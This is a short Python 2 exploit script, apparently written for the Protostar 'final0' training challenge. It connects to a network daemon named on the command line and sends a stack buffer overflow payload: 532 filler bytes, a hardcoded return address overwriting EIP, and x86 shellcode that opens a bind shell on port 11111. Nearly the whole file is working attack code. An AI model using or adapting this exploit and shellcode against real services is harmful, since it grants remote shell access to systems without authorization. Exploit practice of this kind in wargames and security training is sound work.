"""
This code is for protostar final0 challange.Will connect to final0 network daemon, send a network bind shellcode payload to the server.
"""
import socket
import sys
import re
import struct

try:
 #create an AF_INET, STREAM socket (TCP)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error, msg:
    print 'Failed to create socket. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1]
    sys.exit()

print 'Socket Created'

host = sys.argv[1]
port = sys.argv[2]

try:
    remote_ip = socket.gethostbyname( host )

except socket.gaierror:
 #could not resolve
    print 'Hostname could not be resolved. Exiting'
    sys.exit()

print 'Ip address of ' + host + ' is ' + remote_ip

#Connect to remote server
s.connect((remote_ip, int(port)))

print 'Socket Connected to ' + host + ' on ip ' + remote_ip
buffer_size = 532
EIP = "\x60\xfc\xff\xbf"
#network bind shell listen 0.0.0.0 11111
shellcode = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"\
"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"\
"\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"\
"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"\
"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"\
"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"\
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"\
"\x41\xcd\x80"
try:
    payload = "A"
    s.sendall((payload*buffer_size)+EIP+shellcode+"\n")

    recv = s.recv(4096)
    print recv

except socket.error:
 #Send failed
    print 'Send failed'
    sys.exit()

print 'Done.'
